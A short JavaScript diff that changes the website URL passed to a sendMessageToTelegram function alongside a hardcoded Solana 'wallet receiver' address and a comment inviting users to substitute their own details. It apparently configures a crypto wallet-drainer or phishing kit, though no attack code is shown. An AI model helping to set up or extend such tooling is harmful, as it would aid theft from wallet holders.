@@ -25,5 +25,5 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const solana_wallet_receiver_id = '5hjXb98QyJY8zB2Tsxy7rs3YB96ewKjjs1HUmERSwsVu';
-const website_url = 'https://sola-sand.vercel.app';
+const website_url = 'sola-sand.vercel.app';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
